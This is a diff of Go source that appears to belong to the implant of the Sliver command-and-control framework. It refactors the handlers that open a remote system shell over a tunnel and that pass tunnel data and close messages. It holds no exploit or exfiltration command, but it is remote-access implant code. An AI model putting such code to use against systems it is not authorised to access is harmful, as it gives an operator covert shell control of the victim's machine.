@@ -39,7 +39,7 @@ const (
 
 var (
 	tunnelHandlers = map[uint32]TunnelHandler{
-		sliverpb.MsgShellTunnel: shellReqHandler,
+		sliverpb.MsgShellReq: shellReqHandler,
 
 		sliverpb.MsgTunnelData:  tunnelDataHandler,
 		sliverpb.MsgTunnelClose: tunnelCloseHandler,
@@ -52,7 +52,9 @@ func GetTunnelHandlers() map[uint32]TunnelHandler {
 }
 
 func tunnelCloseHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
-	tunnelClose := &sliverpb.TunnelClose{}
+	tunnelClose := &sliverpb.TunnelData{
+		Closed: true,
+	}
 	proto.Unmarshal(envelope.Data, tunnelClose)
 	tunnel := connection.Tunnel(tunnelClose.TunnelID)
 	if tunnel != nil {
@@ -66,17 +68,17 @@ func tunnelCloseHandler(envelope *sliverpb.Envelope, connection *transports.Conn
 }
 
 func tunnelDataHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
-	tunData := &sliverpb.TunnelData{}
-	proto.Unmarshal(envelope.Data, tunData)
-	tunnel := connection.Tunnel(tunData.TunnelID)
+	data := &sliverpb.TunnelData{}
+	proto.Unmarshal(envelope.Data, data)
+	tunnel := connection.Tunnel(data.TunnelID)
 	if tunnel != nil {
 		// {{if .Debug}}
-		log.Printf("[tunnel] Write %d bytes to tunnel %d", len(tunData.Data), tunnel.ID)
+		log.Printf("[tunnel] Write %d bytes to tunnel %d", len(data.Data), tunnel.ID)
 		// {{end}}
-		tunnel.Writer.Write(tunData.Data)
+		tunnel.Writer.Write(data.Data)
 	} else {
 		// {{if .Debug}}
-		log.Printf("Data for nil tunnel %d", tunData.TunnelID)
+		log.Printf("Data for nil tunnel %d", data.TunnelID)
 		// {{end}}
 	}
 }
@@ -100,7 +102,7 @@ func (t tunnelWriter) Write(data []byte) (n int, err error) {
 
 func shellReqHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
 
-	shellReq := &sliverpb.ShellTunnel{}
+	shellReq := &sliverpb.ShellReq{}
 	err := proto.Unmarshal(envelope.Data, shellReq)
 	if err != nil {
 		return
@@ -124,12 +126,14 @@ func shellReqHandler(envelope *sliverpb.Envelope, connection *transports.Connect
 	}
 	connection.AddTunnel(tunnel)
 
-	shellTun, _ := proto.Marshal(&sliverpb.ShellTunnel{
-		Pid: uint32(systemShell.Command.Process.Pid),
+	shellResp, _ := proto.Marshal(&sliverpb.Shell{
+		Pid:      uint32(systemShell.Command.Process.Pid),
+		Path:     shellReq.Path,
+		TunnelID: shellReq.TunnelID,
 	})
 	connection.Send <- &sliverpb.Envelope{
 		ID:   envelope.ID,
-		Data: shellTun,
+		Data: shellResp,
 	}
 
 	// Cleanup function with arguments
@@ -138,7 +142,8 @@ func shellReqHandler(envelope *sliverpb.Envelope, connection *transports.Connect
 		log.Printf("Closing tunnel %d", tunnel.ID)
 		// {{end}}
 		connection.RemoveTunnel(tunnel.ID)
-		tunnelClose, _ := proto.Marshal(&sliverpb.TunnelClose{
+		tunnelClose, _ := proto.Marshal(&sliverpb.TunnelData{
+			Closed:   true,
 			TunnelID: tunnel.ID,
 		})
 		connection.Send <- &sliverpb.Envelope{
